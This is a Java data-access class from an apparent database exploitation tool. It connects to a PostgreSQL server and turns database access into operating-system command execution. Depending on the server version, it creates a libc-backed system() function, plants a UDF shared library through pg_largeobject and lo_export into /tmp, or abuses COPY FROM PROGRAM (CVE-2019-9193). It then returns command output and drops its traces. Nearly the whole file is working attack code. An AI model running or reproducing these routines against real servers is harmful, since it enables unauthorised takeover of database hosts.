package Dao;

import Controller.PostgreSqlController;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.Utils;
import Util.YamlConfigs;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.*;
import java.text.MessageFormat;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

/**
 * @author ch1ng & j1anFen
 */
public class PostgreSqlDao {
    private String JARFILE;
    private String JDBCURL;
    private String DRIVER;
    private String USERNAME;
    private String PASSWORD;

    private Connection CONN = null;
    private URLClassLoader URLCLASSLOADER = null;
    private Method METHOD = null;

    private Double versionNumber = null;
    private String systemplatform = "";
    private String evalType = "";
    private String pluginFile = "";

    /**
     * 用此方法获取 PostgreSqlController 的日志框
     */
    private PostgreSqlController postgreSqlController = (PostgreSqlController) ControllersFactory.controllers.get(PostgreSqlController.class.getSimpleName());


    public PostgreSqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
        // 从配置文件读取变量
        YamlConfigs configs = new YamlConfigs();
        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
        JARFILE = (String) configs.getValue("PostgreSql.Driver",yamlToMap);
        JDBCURL = (String) configs.getValue("PostgreSql.JDBCUrl",yamlToMap);
        DRIVER = (String) configs.getValue("PostgreSql.ClassName",yamlToMap);
        //JDBCURL = JDBCURL + "?loginTimeout=" + timeout + "&socketTimeout=" + timeout;
        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database,timeout);
        USERNAME = username;
        PASSWORD = password;
        // 动态加载
        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        METHOD.setAccessible(true);
        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
        URL url = (new File(JARFILE)).toURI().toURL();
        METHOD.invoke(URLCLASSLOADER, url);
        Class.forName(DRIVER);
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws SQLException
     */
    public void testConnection() throws SQLException {
        if (CONN == null || CONN.isClosed()) {
            Utils.regroupDrivers("ostgresql");
            DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
            closeConnection();
        }
    }

    public Connection getConnection() throws SQLException {
        if (CONN == null || CONN.isClosed()) {
            Utils.regroupDrivers("ostgresql");
            CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
        }
        return CONN;
    }

    public void closeConnection() throws SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * postgres < 8.2直接使用system函数执行命令
     */
    public void createEval() {
        try {
            List<String> libFiles = Arrays.asList("/lib/x86_64-linux-gnu/libc.so.6", "/lib/libc.so.6", "/lib64/libc.so.6");

            for (String libFile : libFiles) {
                try {
                    String libSql = MessageFormat.format("CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ''{0}'', ''system'' LANGUAGE ''c'' STRICT;", libFile);
                    PreparedStatement st = CONN.prepareStatement(libSql);
                    st.executeQuery();
                    postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本<=8.2创建system函数成功,使用copy获取回显,无法回显请OOB"));
                } catch (Exception e) {
                    MessageUtil.showExceptionMessage(e, e.getMessage());
                }
            }
        } catch (Exception e) {
            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(e.getMessage()));
        }
    }


    private void injectUdf(int randomPIN, String udfHex) {
        /**
         * 分片4096个16进制插入largeobject
         * */
        try {
            String injectStr = "INSERT INTO pg_largeobject VALUES (%d, %d, decode('%s', 'hex'));";
            List<String> udfSplit = Utils.getStrList(udfHex, 4096);

            for (int i = 0; i < udfSplit.size(); i++) {
                String injectex = String.format(injectStr, randomPIN, i, udfSplit.get(i));
                PreparedStatement st = CONN.prepareStatement(injectex);
                st.executeUpdate();

            }

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * UDF提权函数
     */
    public void udf() {
        try {
            int randomPIN = (int) (Math.random() * 9000) + 1000;
            String sql = "SELECT lo_create(" + randomPIN + ");";
            PreparedStatement st = CONN.prepareStatement(sql);
            st.execute();

            // 写入udf
            injectUdf(randomPIN, pluginFile);

            String sqlExport = "SELECT lo_export(" + randomPIN + ", '/tmp/." + randomPIN + ".so');";
            PreparedStatement st1 = CONN.prepareStatement(sqlExport);
            st1.execute();

            String sqlFunc = "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/." + randomPIN + ".so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;";
            PreparedStatement st2 = CONN.prepareStatement(sqlFunc);
            st2.execute();

            String sqlUnlink = "SELECT lo_unlink (" + randomPIN + ");";
            PreparedStatement st3 = CONN.prepareStatement(sqlUnlink);
            st3.execute();
            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("udf库写入成功,请尝试执行系统命令"));
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    public String LowVersionEval(String command,String code) throws SQLException {
        try {
            String sql = "CREATE TABLE sectest111(t TEXT);";
            PreparedStatement st = CONN.prepareStatement(sql);
            st.executeUpdate();

            String sql1 = "select system('" + command + "> /tmp/.postgre_system') as s;";
            PreparedStatement st1 = CONN.prepareStatement(sql1);
            st1.executeQuery();

            String tmpSql = "COPY sectest111 FROM '/tmp/.postgre_system';";
            PreparedStatement st2 = CONN.prepareStatement(tmpSql);
            st2.executeUpdate();

            String resultSql = "SELECT * FROM sectest111;";
            PreparedStatement st3 = CONN.prepareStatement(resultSql);
            ResultSet rs2 = st3.executeQuery();

            StringBuilder resultStr = new StringBuilder();

            while (rs2.next()) {
                resultStr.append(new String(rs2.getBytes(1),code));
                resultStr.append("\n");
            }
            return resultStr.toString();

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        } finally {
            String tmp1Sql = "drop table sectest111;";
            PreparedStatement st4 = CONN.prepareStatement(tmp1Sql);
            st4.executeUpdate();
        }
        return "";
    }

    public String udfEval(String command,String code) {
        try {
            String resultSql = "select sys_eval('" + command + "');";
            PreparedStatement st = CONN.prepareStatement(resultSql);
            ResultSet rs = st.executeQuery();
            while (rs.next()) {
                return new String(rs.getBytes(1),code);
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return "";
    }

    // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193
    public String cveEval(String command,String code) throws SQLException {
        try {

            // 单引号需要双写转义
            String repCommand = command.replace("'", "''");

            String tmp1Sql = "DROP TABLE IF EXISTS cmd_exec;";
            PreparedStatement st4 = CONN.prepareStatement(tmp1Sql);
            st4.executeUpdate();

            String sql = "CREATE TABLE cmd_exec(cmd_output text);";
            PreparedStatement st = CONN.prepareStatement(sql);
            st.executeUpdate();

            String tmpSql = "COPY cmd_exec FROM PROGRAM '" + repCommand + "';";
            PreparedStatement st2 = CONN.prepareStatement(tmpSql);
            st2.executeUpdate();

            String resultSql = "SELECT * FROM cmd_exec;";
            PreparedStatement st3 = CONN.prepareStatement(resultSql);
            ResultSet rs2 = st3.executeQuery();

            // 再次删除表
            st4.executeUpdate();

            StringBuilder resultStr = new StringBuilder();

            while (rs2.next()) {
                resultStr.append(new String(rs2.getBytes(1),code));
                resultStr.append("\n");
            }
            return resultStr.toString();

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return null;
    }

    public String eval(String command,String code) throws SQLException {
        String result = "";
        switch (evalType) {
            case "low":
                result = LowVersionEval(command,code);
                break;
            case "udf":
                result = udfEval(command,code);
                break;
            default:
                result = cveEval(command,code);
        }
        return result;
    }

    public void clear() {
        try {
            String sql = "drop function sys_eval(text);";
            PreparedStatement st = CONN.prepareStatement(sql);
            ResultSet rs = st.executeQuery();

            postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("清除函数"));
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }

    }

    public void getInfo() {
        try {
            List<String> wVersion = Arrays.asList("w64", "w32", "mingw", "visual studio");

            String sql = "SELECT version() as v;";

            PreparedStatement st = CONN.prepareStatement(sql);

            ResultSet rs = st.executeQuery();

            while (rs.next()) {
                String version = rs.getString("v");
                for (String str : wVersion) {
                    if (version.contains(str)) {
                        systemplatform = "windows";
                        break;
                    }
                }
                systemplatform = "linux";
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("postgre版本：%s", version)));
            }

            // 获取具体版本
            String sqlVersion = "SHOW server_version";
            PreparedStatement st1 = CONN.prepareStatement(sqlVersion);

            ResultSet rs1 = st1.executeQuery();

            while (rs1.next()) {
                String versionStr;

                String result = rs1.getString(1);
                if (result.indexOf(" ") > 0) {
                    versionStr = result.substring(0, result.indexOf(" ") + 1);
                } else {
                    versionStr = result;
                }
                String[] versionSplit = versionStr.split("\\.");
                versionNumber = Double.parseDouble(String.join(".", versionSplit[0], versionSplit[1]));
            }

            // 版本选择
            // 老版本编译gcc 4.2
            // List<Double> udfOldVersion = Arrays.asList(8.2, 8.3, 8.4);
            // todo 设置UDF

            if (versionNumber <= 8.2) {
                evalType = "low";
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本小于8.2可直接创建system函数"));
            } else if (versionNumber > 8.2 && versionNumber < 9.3) {
                evalType = "udf";
                // 设置本地文件目录
                String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + ".txt";
                pluginFile = Utils.readFile(path);
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行UDF提权"));
            } else if (versionNumber >= 9.3) {
                evalType = "cve";
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3以上版本默认使用 CVE-2019-9193,如失败请使用UDF提权"));
            } else {
                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("该版本尚未编译UDF或无法提权"));
            }

        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

//    public static void main(String[] args) {
//        try {
//            MysqlDao md = new MysqlDao("192.168.18.159","3306","mysql","root","root");
//            System.out.println(testConnection());
//            System.out.println("success");
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
}
